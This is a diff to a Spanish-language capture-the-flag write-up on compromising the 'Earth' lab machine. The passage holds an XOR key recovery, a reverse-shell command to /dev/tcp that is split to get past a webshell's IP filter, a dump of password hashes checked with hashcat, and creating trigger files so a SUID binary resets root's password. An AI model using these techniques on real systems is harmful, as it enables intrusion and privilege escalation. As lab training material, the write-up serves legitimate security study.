@@ -24,7 +24,9 @@ PING 192.168.1.53 (192.168.1.53) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 15.385/15.385/15.385/0.000 ms
 ```
+
 -------------------------------------------------------------------------------
+
 Y ahora realizamos un escaneo rápido para ver qué servicios están corriendo en la máquina:
 
 ```bash
@@ -301,7 +303,7 @@ Sin embargo, la longitud del mensaje decodificado es muy similar a la del mensaj
 30
 ```
 
-ESto nos puede dar una pista del tipo de algoritmo usado en la codificación.
+Esto nos puede dar una pista del tipo de algoritmo usado en la codificación.
 
 Además, si cambiamos la key, el mensaje codificado cambia:
 
@@ -442,16 +444,19 @@ Seguimos investigando realizando más enumeraciones. Estas son las enumeracione 
 
 	```bash
 	wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://terratest.earth.local/FUZZ  
+		Nada
 	```
 
 	- php files
 	```bash
 	wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://terratest.earth.local/FUZZ.php
+		Nada
 	```
 
 	- js files
 	```bash
 	wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://terratest.earth.local/FUZZ.js
+		Nada
 	```
 
 - Para https://terratest.earth.local:443
@@ -460,6 +465,7 @@ Seguimos investigando realizando más enumeraciones. Estas son las enumeracione 
 
 	```bash
 	wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://terratest.earth.local:443/FUZZ
+		Nada
 	```
 
 	- Ficheros backup con gobuster
@@ -511,7 +517,7 @@ Disallow: /*.xml
 Disallow: /testingnotes.*
 ```
 
-Vemos que hay una entrada para no permitir el acceso a ficheros ** "testingnotes.*" ** a los rastreadores.
+Vemos que hay una entrada para no permitir el acceso a ficheros **testingnotes. ** a los rastreadores.
 
 (para información sobre como funiona los ficheros *robots.txt*:
 
@@ -629,11 +635,11 @@ Y ya podemos realizar el proceso de obtención de la clave original utilizando e
 earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
 ```
 
-Así pues la clave utilizada parece ser la siguiente *earthclimatechangebad4humans*
+Así pues la clave utilizada parece ser la siguiente **earthclimatechangebad4humans**
 
 -------------------------------------------------------------------------------
 
-Probando en el panel de login con el username *terra* y el password *earthclimatechangebad4humans* logramos acceder al sistema:
+Probando en el panel de login con el username **terra** y el password **earthclimatechangebad4humans** logramos acceder al sistema:
 
 ![adminpanel.png](adminpanel.png)
 
@@ -661,7 +667,7 @@ Al introducir cualquiera de los anteriores comandos en la webshell, vemos que no
 
 ![adminpanel_remote_forbidden.png](adminpanel_remote_forbidden.png)
 
-Una posible idea es partir el comando en 2 partes de manera que no pueda detectar la dirección ip
+Una posible idea es partir el comando en 2 partes de manera que no pueda detectar la dirección IP
 
 ```bash
 > echo "sh -i >& /dev/tcp/192.168." > /tmp/rshell.txt
@@ -700,6 +706,54 @@ Tras el tratamiento típico de la reverse shell para poder operar con mayor faci
 
 Tras esto, intentamos averiguar donde está el código que controla esta webshell.
 
+Al entrar en el sistema aparecemos en la raiz, y si vamos al directorio home este está situado en */usr/share/httpd*
+
+```bash
+bash-5.1$ pwd
+/
+bash-5.1$ cd
+bash-5.1$ pwd
+/usr/share/httpd
+```
+
+Tras inspeccionar un poco, no encontramos nada, así que miramos si en /var existe el directorio www típico
+
+```
+bash-5.1$ ls    
+account  crash	   empty  kerberos  lock  nis	    run    www
+adm	db	   ftp    lib	    log   opt	    spool  yp
+cache	earth_web  games  local     mail  preserve  tmp
+```
+
+Y vemos que no solo existe *www* sino que hay un directorio interesante llamado **earth_web**.
+El directorio www contiene los ficheros de terratest.earth.local:
+
+```bash
+bash-5.1$ cd www
+bash-5.1$ ls -la
+total 4
+drwxr-xr-x.  4 root root   33 Oct  7  2021 .
+drwxr-xr-x. 22 root root 4096 Oct 12  2021 ..
+drwxr-xr-x.  2 root root    6 Oct  7  2021 cgi-bin
+drwxr-xr-x.  3 root root   35 Oct 12  2021 html
+bash-5.1$ cd html
+bash-5.1$ ls -la
+total 0
+drwxr-xr-x. 3 root root 35 Oct 12  2021 .
+drwxr-xr-x. 4 root root 33 Oct  7  2021 ..
+drw-r-xr-x. 2 root root 86 Oct 13  2021 terratest.earth.local
+bash-5.1$ cd terratest.earth.local
+bash-5.1$ ls -la
+total 16
+drw-r-xr-x. 2 root root  86 Oct 13  2021 .
+drwxr-xr-x. 3 root root  35 Oct 12  2021 ..
+-rw-r--r--. 1 root root  26 Oct 12  2021 index.html
+-rw-r--r--. 1 root root 521 Oct 12  2021 robots.txt
+-rw-r--r--. 1 root root 404 Oct 12  2021 testdata.txt
+-rw-r--r--. 1 root root 546 Oct 13  2021 testingnotes.txt
+```
+
+Vamos a inspeccionar ahora **earth_web**:
 
 ```bash
 cd /var/earth_web
@@ -714,6 +768,7 @@ drwxr-xr-x.  3 root root    108 Oct 13  2021 earth_web
 drwxr-xr-x.  6 root root    204 Oct 13  2021 secure_message
 -rw-r--r--.  1 root root     45 Oct 12  2021 user_flag.txt
 ```
+
 Y en este directorio obtenemos la flag del usuario:
 
 ```bash
@@ -742,7 +797,7 @@ auth_user                        django_session
 auth_user_groups                 secure_message_encryptedmessage
 auth_user_user_permissions   
 ```
-y ahora podemos ver qué usuarios hay almacenados en la tabla **auth_user**
+y ahora podemos ver qué usuarios hay almacenados en la tabla *auth_user*
 
 ```sql
 sqlite> select * from auth_user;
@@ -752,9 +807,9 @@ sqlite> select * from auth_user;
 
 -------------------------------------------------------------------------------
 
-A priori ese password debería ser el mismo que hemos utilizado en el panel de login para entrar en la CLI de administración, pero podemos comprobarlo utilizando hashcat
+A priori ese password debería ser el mismo que hemos utilizado en el panel de login para entrar en la CLI de administración, pero podemos comprobarlo utilizando *hashcat*
 
-El tipo de hash **pbkdf2_sha256** es el usado por Django. El hash encontrado el la base de datos, lo guardamos en hash.txt y el password del panel de login en password.txt
+El tipo de hash *pbkdf2_sha256* es el usado por *Django*. El hash encontrado el la base de datos, lo guardamos en **hash.txt** y el password del panel de login en **password.txt**.
 
 ```bash
 > hashcat -m 10000 hash.txt password.txt 
@@ -819,7 +874,7 @@ Hardware.Mon.#1..: Util: 58%
 Stopped: Sun Jan 29 08:56:32 2023
 ```
 
-Como podemos ver por la línea ** Status...........: Cracked ** Hash y password coinciden, por lo que no hace falta esa credencial no nos aporta nada nuevo.
+Como podemos ver por la línea **Status...........: Cracked** Hash y password coinciden, por lo esa credencial no nos aporta nada nuevo.
 
 -------------------------------------------------------------------------------
 
@@ -852,13 +907,13 @@ Probamos a encontrar ficheros con permisos de ejecución privilegiados:
 
 -------------------------------------------------------------------------------
 
-Podemos intentar mirar qué capabilities tenemos dsponibles en el sistema:
+Y tambien podemos intentar mirar qué capabilities tenemos disponibles en el sistema:
 
 ```bash
 sh-5.1$ getcap                  
 sh: getcap: command not found
 ```
-Vemos que el comando getcap no está disponible, por lo que no podremos mirar las capabilities con el siguiente comando:
+Vemos que el comando *getcap* no está disponible, por lo que no podremos mirar las capabilities con el siguiente comando:
 
 ```bash
 getcap -r / 2>/dev/null 
@@ -866,7 +921,7 @@ getcap -r / 2>/dev/null
 
 -------------------------------------------------------------------------------
 
-Si miramos el comando reset root, no encontramos información por internet. Vemos que el comando no es un script ejecutable, sino un binario.
+De los comandos con privilegios en la ejecución que hemos encontrado antes, miramos el comando **reset_root**, y no encontramos información por internet. Vemos que el comando no es un script ejecutable, sino un binario.
 Al ejecutarlo obtenemos la siguiente salida:
                                                    
 ```bash
@@ -909,9 +964,9 @@ GA+omit_frame_pointer
 ```
 
 Gracias a esto podemos intuir que el comando lo que hace es cambiar el password de root si se acontecen unas determinadas condiciones.
-Aparecen como posibles credenciales/passwords las palabras: paleblue, theEarthisflat, o Earth. Esta última es la que parece que se establece cuando se cambie el password con el comando reset_root.
+Aparecen como posibles credenciales/passwords las palabras: **paleblue**, **theEarthisflat**, o **Earth**. Esta última es la que parece que se establece cuando se cambie el password con el comando **reset_root**.
 
-Podemos intentar mirar qué ocurre con ltrace, pero para ello descargaremos el binario de la máquina víctima a la máquina local nuestra como atacantes.
+Podemos intentar mirar qué ocurre con *ltrace*, pero para ello descargaremos el binario de la máquina víctima a la máquina local nuestra como atacantes.
 
 ```bash
 > ltrace ./reset_root 
@@ -925,7 +980,7 @@ puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRE
 +++ exited (status 0) +++
 ```
 
-Por lo que parece, se espera tener acceso a unos ficheros específicos en /dev/shm y /tmp, así que podemos crear dichos ficheros y probar de nuevo el comando a ver qué ocurre:
+Por lo que parece, se espera tener acceso a unos ficheros específicos en */dev/shm* y */tmp*, así que podemos crear dichos ficheros y probar de nuevo el comando a ver qué ocurre:
 
 ```bash
 sh-5.1$ touch /tmp/kcM0Wewe
@@ -937,7 +992,6 @@ RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
 ```
 
 Parece que ha funcionado porque el mensaje es diferente. Probemos a entrar como el usuario root con el password proporcionado:
-
 
 ```bash
 sh-5.1$ su root
